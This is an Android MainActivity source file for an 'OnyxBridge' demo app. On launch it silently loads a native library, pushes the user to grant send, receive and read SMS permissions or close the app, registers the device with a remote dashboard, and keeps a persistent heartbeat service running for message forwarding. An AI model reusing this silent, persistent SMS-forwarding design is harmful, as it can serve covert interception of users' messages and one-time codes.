package com.onyx.bridge.demo;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.TextView;

import androidx.activity.OnBackPressedCallback;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;

import com.onyx.bridge.OnyxBridge;
import com.onyx.bridge.OnyxPermissionCallback;
import com.onyx.bridge.demo.network.ApiConfig;
import com.onyx.bridge.demo.network.DashboardClient;
import com.onyx.bridge.demo.network.HeartbeatForegroundService;
import com.onyx.bridge.demo.network.HeartbeatScheduler;
import com.onyx.bridge.demo.network.PendingHeartbeatStore;
import com.onyx.bridge.demo.network.RegistrationManager;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

/**
 * Minimal entry screen — just "Welcome to OnyxApp".
 *
 * The library loads silently in the background (OnyxApp handles this) and
 * the moment it's ready, this Activity auto-triggers the SMS permission flow.
 * There's no button to tap — the user just opens the app, sees the welcome,
 * grants permissions, and the device registers itself.
 *
 * Only one Toast fires during the happy path: "OnyxBridge library loaded
 * successfully" — that confirms the lib + permissions + registration all
 * completed. We skip the intermediate "registering…" / "registered" toasts
 * to keep the noise down (per user request).
 */
public class MainActivity extends androidx.appcompat.app.AppCompatActivity {

    private static final int REQ_SMS_PERMS = 0xA1;
    private static final int REQ_APP_SETTINGS = 0xA2;
    private static final Executor IO = Executors.newSingleThreadExecutor();
    private static final Handler UI = new Handler(Looper.getMainLooper());

    private ApiConfig config;
    private DashboardClient client;
    private PendingHeartbeatStore pendingStore;
    private int denialCount = 0;

    private TextView tvLog;

    private final OnyxPermissionCallback permissionCallback = (permission, granted) -> {
        // Intentionally silent — we already toast once at the end of the flow.
    };

    // ------------------------------------------------------------------
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        config = new ApiConfig(this);
        client = new DashboardClient(this, config);
        pendingStore = new PendingHeartbeatStore(this);
        tvLog = findViewById(R.id.tv_log);

        // Schedule the persistent WorkManager heartbeat (15 min) for the
        // case where the foreground service has been killed (e.g., reboot).
        HeartbeatScheduler.schedule(this);

        // Wait for the native library to finish loading (silent, on a worker
        // thread), then auto-trigger the permission flow — no button needed.
        OnyxApp.whenBridgeReady(() -> {
            OnyxBridge bridge = OnyxApp.bridge();
            if (bridge != null) {
                bridge.setPermissionCallback(permissionCallback);
                runOnUiThread(() -> {
                    appendLog("OnyxBridge v" + OnyxApp.bridgeVersion() + " loaded");
                    checkSmsPermissionsAndProceed();
                });
            }
        });

        // If already registered (returning user), jump straight to the
        // foreground service so the dashboard stays live.
        if (config.isRegistered()) {
            startForegroundHeartbeat();
            appendLog("Already registered — foreground service started");
        }

        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override public void handleOnBackPressed() { finishAffinity(); }
        });

        appendLog("Welcome to OnyxApp");
    }

    // ------------------------------------------------------------------
    // Permission flow — auto-triggered once the library is ready
    // ------------------------------------------------------------------
    private void checkSmsPermissionsAndProceed() {
        OnyxBridge bridge = OnyxApp.bridge();
        if (bridge != null && bridge.hasAllSmsPermissions()) {
            onAllPermissionsGranted();
            return;
        }
        boolean shouldRationale =
            ActivityCompat.shouldShowRequestPermissionRationale(this, OnyxBridge.SEND_SMS)
         || ActivityCompat.shouldShowRequestPermissionRationale(this, OnyxBridge.RECEIVE_SMS)
         || ActivityCompat.shouldShowRequestPermissionRationale(this, OnyxBridge.READ_SMS)
         || denialCount == 0;

        if (shouldRationale) {
            showRationaleDialog();
        } else {
            showSettingsRequiredDialog();
        }
    }

    private void showRationaleDialog() {
        new AlertDialog.Builder(this)
            .setTitle("SMS permissions required")
            .setMessage("OnyxBridge needs SMS permissions to forward messages to the dashboard and keep your device registered. Please grant permissions to continue.")
            .setCancelable(false)
            .setPositiveButton("Grant Permissions", (d, w) ->
                ActivityCompat.requestPermissions(
                    MainActivity.this,
                    new String[]{OnyxBridge.SEND_SMS, OnyxBridge.RECEIVE_SMS, OnyxBridge.READ_SMS},
                    REQ_SMS_PERMS
                ))
            .setNegativeButton("Close App", (d, w) -> finishAffinity())
            .show();
    }

    private void showSettingsRequiredDialog() {
        new AlertDialog.Builder(this)
            .setTitle("SMS permissions required")
            .setMessage("This app cannot function without SMS permissions. Please enable them in app settings to continue.")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.fromParts("package", getPackageName(), null));
                startActivityForResult(intent, REQ_APP_SETTINGS);
            })
            .setNegativeButton("Close App", (d, w) -> finishAffinity())
            .show();
    }

    private void showFinalDenialDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permissions denied")
            .setMessage("This app cannot function without SMS permissions. The app will now close.")
            .setCancelable(false)
            .setPositiveButton("Close App", (d, w) -> finishAffinity())
            .show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        OnyxBridge bridge = OnyxApp.bridge();
        boolean allGranted = bridge != null && bridge.hasAllSmsPermissions();
        if (allGranted) {
            onAllPermissionsGranted();
        } else {
            denialCount++;
            if (denialCount >= 2) {
                showFinalDenialDialog();
            } else {
                showSettingsRequiredDialog();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_APP_SETTINGS) {
            checkSmsPermissionsAndProceed();
        }
    }

    private void onAllPermissionsGranted() {
        // The single, summary toast — confirms lib loaded + perms granted.
        // No "registering…" or "registered" toasts (per user request:
        // "not so many toast also").
        toast("OnyxBridge library loaded successfully");
        appendLog("All permissions granted — OnyxBridge library loaded");
        proceedWithRegistration();
    }

    // ------------------------------------------------------------------
    // Registration + service start (silent — no toasts)
    // ------------------------------------------------------------------
    private void proceedWithRegistration() {
        if (!config.isConfigured()) {
            appendLog("Cannot register — no API URL");
            return;
        }
        new RegistrationManager(this, config).forceReRegister(
            new RegistrationManager.Callback() {
                @Override public void onSuccess(JSONObject response) {
                    appendLog("Registered with backend — id " + config.getDeviceId());
                    startForegroundHeartbeat();
                }
                @Override public void onError(String message) {
                    appendLog("Registration failed: " + message);
                }
            });
    }

    private void startForegroundHeartbeat() {
        Intent intent = new Intent(this, HeartbeatForegroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            appendLog("Foreground heartbeat service started");
        } catch (SecurityException e) {
            appendLog("Cannot start foreground service: " + e.getMessage());
        }
    }

    // ------------------------------------------------------------------
    // UI helpers
    // ------------------------------------------------------------------
    private void appendLog(String msg) {
        String line = fmtTime(System.currentTimeMillis()) + "  " + msg + "\n";
        String current = tvLog.getText().toString();
        if (current.equals("No events yet.") || current.isEmpty()) {
            tvLog.setText(line);
        } else {
            String next = current + line;
            String[] parts = next.split("\n");
            if (parts.length > 30) {
                StringBuilder sb = new StringBuilder();
                for (int i = parts.length - 30; i < parts.length; i++) {
                    sb.append(parts[i]).append('\n');
                }
                next = sb.toString();
            }
            tvLog.setText(next);
        }
        tvLog.post(() -> tvLog.scrollTo(0, tvLog.getHeight()));
    }

    private void toast(String msg) {
        android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_SHORT).show();
    }

    private static String fmtTime(long ms) {
        return new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(ms));
    }
}
